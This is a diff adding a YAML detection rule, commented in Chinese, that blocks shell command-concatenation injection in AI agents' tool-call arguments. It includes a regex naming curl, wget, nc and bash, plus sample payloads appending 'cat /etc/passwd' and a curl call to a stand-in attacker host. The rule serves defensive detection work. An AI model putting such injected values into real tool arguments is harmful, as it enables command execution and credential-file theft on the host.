@@ -1,0 +1,35 @@
+# AIGuardFabric 检测规则 —— 命令拼接注入（分号/管道/与运算）
+# 安全域: tool-abuse（工具与权限滥用）｜ 检测目标: tool-arguments ｜ 算子: regex ｜ 等级: critical
+# 正负样本内联在 samples.positive / samples.negative：正样本必须命中、负样本必须不命中，
+# 该约束由 crates/agf-scan/tests/rules_library.rs 强制（含内置负样本基线）。
+# 参考: https://cwe.mitre.org/data/definitions/78.html
+key: TA-CMD-008
+name: 命令拼接注入（分号/管道/与运算）
+description: 常见命令拼接符后紧跟可执行程序名，属参数注入的典型形态。
+domain: tool-abuse
+severity: critical
+kind: regex
+target: tool-arguments
+action: deny
+enabled: true
+rollout_percent: 100
+tags:
+- CWE-78
+- command-injection
+references:
+- https://cwe.mitre.org/data/definitions/78.html
+detection:
+  type: regex
+  pattern: '(?i)(;|\|\||&&)\s*(cat|curl|wget|nc|bash|sh|python|powershell|whoami|id)\b'
+  case_insensitive: true
+  min_matches: 1
+samples:
+  positive:
+  - '{"tool":"ping","args":{"host":"127.0.0.1; cat /etc/passwd"}}'
+  - example.com && curl http://evil.invalid/x
+  negative:
+  - '{"tool":"ping","args":{"host":"example.com"}}'
+  - 在 shell 中，A && B 表示 A 成功后再执行 B，请解释 || 的语义。
+remediation: 入参做严格字符白名单（如仅允许域名/IP）；调用外部程序使用 exec 数组形式。
+author: agf-rules
+version: 1
